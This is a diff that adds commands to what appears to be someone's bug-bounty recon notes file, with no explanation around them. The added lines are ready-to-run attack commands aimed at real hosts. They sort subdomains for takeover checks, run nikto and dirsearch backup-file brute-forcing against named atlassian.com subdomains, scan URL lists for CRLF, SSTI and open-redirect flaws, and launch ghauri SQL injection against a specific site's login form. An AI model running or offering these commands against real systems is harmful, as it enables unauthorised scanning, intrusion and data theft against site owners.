@@ -811,4 +811,27 @@ dirsearch -u https://sub.domain.com -x 403,404,500,400,502,503,429 --random-agen
 Extension based Fuzzing
 dirsearch -u https://sub.domain.com -e xml,json,sql,db,log,yml,yaml,bak,txt,tar.gz,zip -x 403,404,500,400,502,503,429 --random-agent
 
+https://chaos.projectdiscovery.io/
+subprober -f acorns.com.txt -sc -tl -l -ar -cn -o subprober.txt
+cat subprober.txt | grep "200" | awk '{print $1}' | sed 's|https\?://||' > 200.txt
+cat subprober.txt | grep "403" | awk '{print $1}' | sed 's|https\?://||' > 403.txt
+cat subprober.txt | grep "404" | awk '{print $1}' | sed 's|https\?://||' > 404.txt
+subjack -c ~/.subjack_fingerprints.json -w 404.txt -t 100 -timeout 30 -o subjack.txt -v
+python3 ~/tools/dnsReaper/main.py file --filename ~/recon/404.txt
+whatweb cloud.e.atlassian.com
+nikto -h cloud.e.atlassian.com -C all
+dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u https://cloud.e.atlassian.com/
 
+subprober -f facebook.com.txt -sc -tl -wc -sv -o subprober1.txt
+dirsearch -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json  -u https://id-mail-assets.atlassian.com/
+
+crlfi -i /home/lipon/Hacking/recon/urls.txt -o crlf.txt
+ssti -l /home/lipon/Hacking/recon/urls.txt -o ssti.txt
+RedirectHunter -l /home/lipon/Hacking/recon/urls.txt -o redirect.txt
+
+
+ghauri -u "https://omnibookslibrary.com/login.php" --data="mobile=*&password=pass&login=" --batch --flush-session
+ghauri -r req.txt --batch --flush-session --level 3
+
+
+pip3 install -r requirements.txt --break-system-packages
